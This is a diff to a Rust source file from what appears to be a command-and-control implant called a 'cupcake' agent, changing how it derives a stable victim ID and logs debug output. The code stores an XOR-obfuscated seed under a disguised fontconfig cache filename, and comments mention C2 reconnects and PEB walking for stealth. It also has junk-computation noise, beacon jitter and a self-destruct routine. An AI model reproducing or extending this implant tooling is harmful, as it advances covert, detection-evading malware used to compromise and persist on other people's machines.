@@ -3,9 +3,9 @@
 // 通过系统特征生成固定的 Agent UUID，无需在磁盘上存储任何文件
 // 使用用户 SID、机器名、处理器架构等特征进行哈希计算
 
-use sha2::{Sha256, Digest};
-use uuid::Builder;
 use log::debug;
+use sha2::{Digest, Sha256};
+use uuid::Builder;
 
 // Per-build key from build.rs (unique each compile unless CUPCAKE_OBF_SEED fixed)
 include!(concat!(env!("OUT_DIR"), "/obf_seed.rs"));
@@ -30,19 +30,75 @@ macro_rules! obf_str {
             .wrapping_add(bytes.first().copied().unwrap_or(0))
             .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
         for (i, b) in bytes.iter().enumerate() {
-            let k = base[i % base.len()].wrapping_add(salt).wrapping_add(i as u8);
+            let k = base[i % base.len()]
+                .wrapping_add(salt)
+                .wrapping_add(i as u8);
             obf.push(b ^ k);
         }
         obf
     }};
 }
 
-/// Debug print function — available in both debug and release for diagnostics.
-/// Prefer using `dbg_print!` macro directly for zero-cost in release.
+/// Debug print — file/stderr only on the PEB-safe path.
+///
+/// **Must not** call `stealth::get_module_base` / PEB walk: PEB used to call `db_print`
+/// inside `Once`, and release `db_print` re-entered PEB for `OutputDebugStringA` → deadlock
+/// (agent freeze, no C2 reconnect). That was the `[peb] HIT ...` log you saw right before hang.
 #[inline(always)]
-pub fn db_print(_msg: &str) {
+pub fn db_print(msg: &str) {
+    // Re-entrancy guard: never nest db_print work (e.g. if a future path logs from I/O hooks).
+    thread_local! {
+        static IN_DB_PRINT: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
+    }
+    if IN_DB_PRINT.with(|c| c.replace(true)) {
+        return;
+    }
+
     #[cfg(debug_assertions)]
-    log::debug!("{}", _msg);
+    log::debug!("{}", msg);
+
+    let line = format!("{}\n", msg);
+
+    // 1. Append next to exe (or cwd) — pure std, no PEB
+    #[cfg(windows)]
+    {
+        use std::io::Write;
+        let log_path = std::env::current_exe()
+            .ok()
+            .and_then(|p| p.parent().map(|d| d.join("cupcake_agent.log")))
+            .unwrap_or_else(|| std::path::PathBuf::from("cupcake_agent.log"));
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .append(true)
+            .create(true)
+            .open(&log_path)
+        {
+            let _ = f.write_all(line.as_bytes());
+        }
+    }
+
+    // 2. stderr if console present — no PEB
+    #[cfg(all(windows, not(debug_assertions)))]
+    {
+        use std::io::Write;
+        let _ = writeln!(std::io::stderr(), "{}", msg);
+    }
+
+    // 3. Optional extra file
+    #[cfg(not(debug_assertions))]
+    {
+        if let Ok(path) = std::env::var("CUPCAKE_DEBUG_FILE") {
+            use std::io::Write;
+            if let Ok(mut f) = std::fs::OpenOptions::new()
+                .append(true)
+                .create(true)
+                .open(&path)
+            {
+                let _ = writeln!(f, "{}", msg);
+            }
+        }
+    }
+
+    IN_DB_PRINT.with(|c| c.set(false));
 }
 
 /// Phase 3: Compile-time no-op string obfuscation marker.
@@ -91,56 +147,70 @@ fn xor_deobf(data: &[u8]) -> Vec<u8> {
     xor_obf(data) // XOR is symmetric
 }
 
+/// Process-wide cached UUID (stable even if disk persist fails mid-run).
+static AGENT_UUID: std::sync::OnceLock<String> = std::sync::OnceLock::new();
+/// Stable XOR material for UUID seed file v1 (not tied to per-build OBF_BUILD_KEY).
+const UUID_SEED_XOR: [u8; 16] = *b"cpx-uuid-seed-v1";
+const UUID_FILE_MAGIC: &[u8; 4] = b"CPXU";
+const UUID_FILE_VER: u8 = 1;
+const UUID_CHK_DOMAIN: &[u8] = b"cpx-uuid-chk-v1";
+
 /// 🛡️ Phase 2: Generate a randomized but persistent Agent UUID.
-/// The UUID is derived from:
-/// 1. A random seed persisted to a hidden file in a common directory
-/// 2. System features (username + hostname) to prevent cross-machine collision
 ///
-/// Persistence strategy (cross-platform, disguised):
-/// - Store in platform-specific "cache" directories with benign-looking filenames
-/// - Content is XOR-obfuscated to look like random data
-/// - File is marked hidden on Windows
-///
-/// The stored value is XOR-obfuscated to look like random data.
+/// 1. Process-local `OnceLock` — same process always returns the same UUID
+/// 2. Disk seed when writable — survives restarts (v1 magic format)
+/// 3. Save failures are retried; identity still stable for this process
 pub fn get_agent_uuid() -> String {
-    // Try to load existing persisted UUID seed
-    let persisted_seed = load_uuid_seed();
-    
-    let seed = match persisted_seed {
-        Some(s) => {
-            debug!("Loaded persisted UUID seed");
-            s
+    AGENT_UUID.get_or_init(|| compute_agent_uuid()).clone()
+}
+
+fn compute_agent_uuid() -> String {
+    let (seed, migrate_legacy) = match load_uuid_seed() {
+        Some((s, legacy)) => {
+            debug!("Loaded persisted UUID seed (legacy={})", legacy);
+            (s, legacy)
         }
         None => {
             let mut new_seed = [0u8; 16];
             let _ = getrandom::getrandom(&mut new_seed);
-            let _ = save_uuid_seed(&new_seed);
-            debug!("Generated and persisted new UUID seed");
-            new_seed
+            if save_uuid_seed(&new_seed).is_err() {
+                let _ = save_uuid_seed_fallback(&new_seed);
+                debug!("UUID seed persist failed — process-stable only");
+            } else {
+                debug!("Generated and persisted new UUID seed");
+            }
+            (new_seed, false)
         }
     };
-    
-    // Combine seed with system features
+    // Migrate legacy raw-16 file to v1 only after successful decode (never on failed decode)
+    if migrate_legacy {
+        let _ = save_uuid_seed(&seed);
+    }
+
     let user = std::env::var("USERNAME")
         .or_else(|_| std::env::var("USER"))
         .unwrap_or_else(|_| "unknown_user".to_string());
     let host = std::env::var("COMPUTERNAME")
         .or_else(|_| std::env::var("HOSTNAME"))
         .unwrap_or_else(|_| "unknown_host".to_string());
-    
+
     let mut hasher = Sha256::new();
     hasher.update(&seed);
     hasher.update(user.as_bytes());
     hasher.update(host.as_bytes());
-    
-    // NOTE: Do NOT add time-based entropy here — UUID must be stable
-    // within a single run for the test suite. The seed itself already
-    // contains sufficient entropy from getrandom at first generation.
-    
+
     let result = hasher.finalize();
     let mut bytes = [0u8; 16];
     bytes.copy_from_slice(&result[..16]);
     Builder::from_bytes(bytes).into_uuid().to_string()
+}
+
+fn uuid_seed_checksum(seed: &[u8; 16]) -> [u8; 4] {
+    let mut h = Sha256::new();
+    h.update(seed);
+    h.update(UUID_CHK_DOMAIN);
+    let d = h.finalize();
+    [d[0], d[1], d[2], d[3]]
 }
 
 /// Get the platform-specific persistence path (disguised)
@@ -157,7 +227,9 @@ fn get_persist_path() -> Option<std::path::PathBuf> {
     #[cfg(target_os = "linux")]
     {
         let home = std::env::var("HOME").ok()?;
-        let base = std::path::Path::new(&home).join(".cache").join("fontconfig");
+        let base = std::path::Path::new(&home)
+            .join(".cache")
+            .join("fontconfig");
         Some(base.join("CACHEDIR.TAG"))
     }
     #[cfg(target_os = "macos")]
@@ -175,56 +247,163 @@ fn get_persist_path() -> Option<std::path::PathBuf> {
     }
 }
 
-/// Load UUID seed from persistent storage
-fn load_uuid_seed() -> Option<[u8; 16]> {
-    let path = get_persist_path()?;
-    let data = std::fs::read(&path).ok()?;
-    if data.len() < 16 { return None; }
-    
-    let deobf = xor_deobf(&data);
-    let mut seed = [0u8; 16];
-    seed.copy_from_slice(&deobf[..16]);
-    Some(seed)
+fn xor_uuid_seed_bytes(seed: &[u8; 16]) -> [u8; 16] {
+    let mut out = [0u8; 16];
+    for i in 0..16 {
+        out[i] = seed[i] ^ UUID_SEED_XOR[i];
+    }
+    out
 }
 
-/// Save UUID seed to persistent storage
+/// Returns (seed, is_legacy_format). Never overwrites file on failed decode.
+fn load_uuid_seed() -> Option<([u8; 16], bool)> {
+    for path in [get_persist_path(), get_persist_path_fallback()]
+        .into_iter()
+        .flatten()
+    {
+        let data = match std::fs::read(&path) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+        // v1: CPXU | ver | seed_xor[16] | csum[4]
+        if data.len() >= 4 + 1 + 16 + 4 && &data[0..4] == UUID_FILE_MAGIC {
+            if data[4] != UUID_FILE_VER {
+                continue; // unknown version — do not rewrite
+            }
+            let mut xored = [0u8; 16];
+            xored.copy_from_slice(&data[5..21]);
+            let seed = xor_uuid_seed_bytes(&xored); // XOR is symmetric
+            let want = uuid_seed_checksum(&seed);
+            if data[21..25] != want {
+                // corrupt or wrong key — never overwrite original file
+                debug!("UUID v1 checksum mismatch — ignoring file");
+                continue;
+            }
+            return Some((seed, false));
+        }
+        // Legacy: exactly 16 bytes, XOR with per-build OBF_BUILD_KEY
+        if data.len() == 16 {
+            let deobf = xor_deobf(&data);
+            if deobf.len() >= 16 {
+                let mut seed = [0u8; 16];
+                seed.copy_from_slice(&deobf[..16]);
+                // Read-only here; caller may migrate after successful decode
+                return Some((seed, true));
+            }
+        }
+    }
+    None
+}
+
+/// Save UUID seed to primary persistence path (v1 magic + checksum, atomic rename).
 fn save_uuid_seed(seed: &[u8; 16]) -> Result<(), ()> {
     let path = get_persist_path().ok_or(())?;
+    write_seed_file_v1(&path, seed)
+}
+
+fn save_uuid_seed_fallback(seed: &[u8; 16]) -> Result<(), ()> {
+    let path = get_persist_path_fallback().ok_or(())?;
+    write_seed_file_v1(&path, seed)
+}
+
+fn write_seed_file_v1(path: &std::path::Path, seed: &[u8; 16]) -> Result<(), ()> {
     if let Some(parent) = path.parent() {
         std::fs::create_dir_all(parent).map_err(|_| ())?;
     }
-    let obf = xor_obf(seed);
-    std::fs::write(&path, &obf).map_err(|_| ())?;
-    Ok(())
+    let xored = xor_uuid_seed_bytes(seed);
+    let csum = uuid_seed_checksum(seed);
+    let mut buf = Vec::with_capacity(25);
+    buf.extend_from_slice(UUID_FILE_MAGIC);
+    buf.push(UUID_FILE_VER);
+    buf.extend_from_slice(&xored);
+    buf.extend_from_slice(&csum);
+    let tmp = path.with_extension("tmp");
+    for _ in 0..3 {
+        if std::fs::write(&tmp, &buf).is_ok() {
+            if std::fs::rename(&tmp, path).is_ok() {
+                return Ok(());
+            }
+            let _ = std::fs::remove_file(&tmp);
+        }
+    }
+    Err(())
+}
+
+#[cfg(test)]
+mod uuid_seed_tests {
+    use super::*;
+
+    #[test]
+    fn v1_roundtrip_checksum() {
+        let seed = [7u8; 16];
+        let dir = std::env::temp_dir().join(format!("cpx_uuid_test_{}", std::process::id()));
+        let _ = std::fs::create_dir_all(&dir);
+        let path = dir.join("seed.v1");
+        write_seed_file_v1(&path, &seed).expect("write v1");
+        let data = std::fs::read(&path).unwrap();
+        assert_eq!(&data[0..4], b"CPXU");
+        // corrupt csum — load via path helper would skip; direct check
+        let mut bad = data.clone();
+        bad[21] ^= 0xff;
+        std::fs::write(&path, &bad).unwrap();
+        // manual parse should fail checksum
+        let mut xored = [0u8; 16];
+        xored.copy_from_slice(&bad[5..21]);
+        let s = xor_uuid_seed_bytes(&xored);
+        assert_ne!(uuid_seed_checksum(&s), bad[21..25]);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn legacy_16_decode_does_not_require_overwrite() {
+        let seed = [3u8; 16];
+        let legacy = xor_obf(&seed); // build-key XOR of plain seed
+        assert_eq!(legacy.len(), 16);
+        let dec = xor_deobf(&legacy);
+        assert_eq!(&dec[..16], &seed[..]);
+    }
+
+    #[test]
+    fn agent_uuid_process_stable() {
+        let a = get_agent_uuid();
+        let b = get_agent_uuid();
+        assert_eq!(a, b);
+        assert_eq!(a.len(), 36);
+    }
+}
+
+fn get_persist_path_fallback() -> Option<std::path::PathBuf> {
+    let tmp = std::env::temp_dir();
+    Some(tmp.join(".cpx_idx"))
 }
 
 /// Legacy UUID generation (fallback if persistence fails)
 #[allow(dead_code)]
 pub fn get_agent_uuid_legacy() -> String {
     let mut identifier = String::new();
-    
+
     let user = std::env::var("USERNAME")
         .or_else(|_| std::env::var("USER"))
         .unwrap_or_else(|_| "unknown_user".to_string());
     identifier.push_str(&user);
-    
+
     let host = std::env::var("COMPUTERNAME")
         .or_else(|_| std::env::var("HOSTNAME"))
         .unwrap_or_else(|_| "unknown_host".to_string());
     identifier.push_str(&host);
-    
+
     if let Ok(arch) = std::env::var("PROCESSOR_IDENTIFIER") {
         identifier.push_str(&arch);
     }
-    
+
     if identifier.is_empty() {
         identifier = "fallback-agent-id".to_string();
     }
-    
+
     let mut hasher = Sha256::new();
     hasher.update(identifier.as_bytes());
     let result = hasher.finalize();
-    
+
     let mut bytes = [0u8; 16];
     bytes.copy_from_slice(&result[..16]);
     Builder::from_bytes(bytes).into_uuid().to_string()
@@ -234,7 +413,7 @@ pub fn get_agent_uuid_legacy() -> String {
 pub fn junk_data_collector() {
     let mut data = Vec::with_capacity(1000);
     let mut _sum = 0.0;
-    
+
     // 1. Computational noise (Heavy math)
     for i in 1..5000 {
         let val = (i as f64).sqrt().sin().cos();
@@ -318,7 +497,9 @@ pub fn random_bool(p: f64) -> bool {
 
 /// Generate a random u32 in range [min, max] (inclusive)
 pub fn random_range(min: u32, max: u32) -> u32 {
-    if min >= max { return min; }
+    if min >= max {
+        return min;
+    }
     let range = max - min + 1;
     min + (next_u32() % range)
 }
@@ -428,6 +609,9 @@ pub async fn self_destruct() -> crate::types::CommandResult {
             .spawn();
     }
 
+    // Clear staged worker PE / supervisor state before hard exit.
+    crate::module_supervisor::supervisor().stop_all();
+
     info!("[+] self-destruct scheduled, exiting");
     std::process::exit(0);
 }
@@ -458,7 +642,9 @@ pub fn get_jitter_delay(base_interval: u64, jitter_percent: u32) -> u64 {
     // Uniform pick in [0, 2*max_delta], then center around base → [base-delta, base+delta]
     let span = max_delta.saturating_mul(2);
     let offset = random_range(0, span as u32) as u64;
-    base_interval.saturating_sub(max_delta).saturating_add(offset)
+    base_interval
+        .saturating_sub(max_delta)
+        .saturating_add(offset)
 }
 
 // =============================================================================
@@ -480,7 +666,11 @@ mod tests {
     fn test_uuid_format() {
         let uuid = get_agent_uuid();
         let parts: Vec<&str> = uuid.split('-').collect();
-        assert_eq!(parts.len(), 5, "UUID should have 5 parts separated by hyphens");
+        assert_eq!(
+            parts.len(),
+            5,
+            "UUID should have 5 parts separated by hyphens"
+        );
         assert_eq!(parts[0].len(), 8, "First part should be 8 chars");
         assert_eq!(parts[1].len(), 4, "Second part should be 4 chars");
         assert_eq!(parts[2].len(), 4, "Third part should be 4 chars");
@@ -541,7 +731,10 @@ mod tests {
         let max = 10u32;
         for _ in 0..100 {
             let val = random_range(min, max);
-            assert!(val >= min && val <= max, "Random value should be within range");
+            assert!(
+                val >= min && val <= max,
+                "Random value should be within range"
+            );
         }
     }
 
